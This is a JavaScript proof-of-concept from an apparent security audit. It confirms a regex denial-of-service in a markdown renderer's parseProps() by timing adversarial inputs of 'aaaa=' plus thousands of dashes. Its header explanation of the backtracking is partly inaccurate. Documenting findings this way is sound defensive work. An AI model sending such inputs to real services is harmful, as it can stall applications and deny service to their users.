/**
 * PoC: ReDoS in parseProps() — src/services/MarkdownRenderer.ts:209
 * Finding: M1 (parseprops-redos)
 *
 * Regex under test (verbatim from source):
 *   /([\w-]+)\s*=\s*(?:{([^}]+?)}|"([^"]+?)")/gim
 *
 * Adversarial input structure:
 *   "aaaa=" followed by N dash characters
 *
 * Why it causes O(n²):
 *   - [\w-]+ matches "aaaa", then \s*=\s* finds "=", then the alternation
 *     (?:{...}|"...") fails because what follows is all dashes (no closing
 *     brace or quote).  The engine resets and retries with [\w-]+ consuming
 *     "aaaa-" (one dash), then "aaaa--", etc., and at each new starting
 *     position the same expansion happens → quadratic backtracking.
 *
 * Target environment: {{BASE_URL}} (N/A for this client-side library PoC)
 * Auth required: no (client-side regex; no HTTP request needed)
 */

'use strict';

// ---- verbatim regex from src/services/MarkdownRenderer.ts:209 ----
function parseProps(props) {
  if (!props) return {};
  const regex = /([\w-]+)\s*=\s*(?:{([^}]+?)}|"([^"]+?)")/gim;
  const parsed = {};
  let match;
  while ((match = regex.exec(props)) !== null) {
    if (match[3]) {
      parsed[match[1]] = match[3];
    } else if (match[2]) {
      try { parsed[match[1]] = JSON.parse(match[2]); } catch (e) { /* noop */ }
    }
  }
  return parsed;
}

// ---- timing helper ----
function timeMs(fn) {
  const start = process.hrtime.bigint();
  fn();
  return Number(process.hrtime.bigint() - start) / 1e6; // ms
}

// ---- benign input (valid prop, should complete instantly) ----
const benignInput = 'foo="bar" baz={123}';
const benignMs = timeMs(() => parseProps(benignInput));
console.log(`[benign]  input length=${benignInput.length}  time=${benignMs.toFixed(2)} ms`);

// ---- adversarial inputs at increasing lengths ----
// Pattern: key=DASHES  (no closing brace/quote → triggers catastrophic backtracking)
const sizes = [1000, 5000, 10000, 25000, 50000];
const results = [];

for (const n of sizes) {
  const adversarial = 'aaaa=' + '-'.repeat(n);
  const ms = timeMs(() => parseProps(adversarial));
  results.push({ n, ms });
  console.log(`[redos]   dashes=${n}  time=${ms.toFixed(1)} ms`);
  // Bail out early if we've already proven the point (>5 s at this size)
  if (ms > 5000) {
    console.log(`  --> early exit: regex took ${(ms/1000).toFixed(1)}s at n=${n}; further sizes skipped to avoid lockup`);
    break;
  }
}

// ---- verdict ----
// O(n²) signature: ratio of times should grow roughly linearly with ratio of n
const confirmed = results.length >= 2 &&
  (results[results.length - 1].ms / results[0].ms) >
  (results[results.length - 1].n  / results[0].n);    // time grows faster than linear → polynomial

const worstMs    = results[results.length - 1].ms;
const worstN     = results[results.length - 1].n;
const evidenceTxt = `parseProps regex stalled for ${worstMs.toFixed(0)} ms on ${worstN}-char adversarial props string (expected <1 ms for benign input of ${benignInput.length} chars)`;

// LAST stdout line — parsed by poc-runner
console.log(JSON.stringify({
  status:   confirmed ? 'confirmed' : 'inconclusive',
  evidence: evidenceTxt,
  notes:    `benign=${benignMs.toFixed(2)}ms worst_adversarial=${worstMs.toFixed(0)}ms at n=${worstN}`
}));
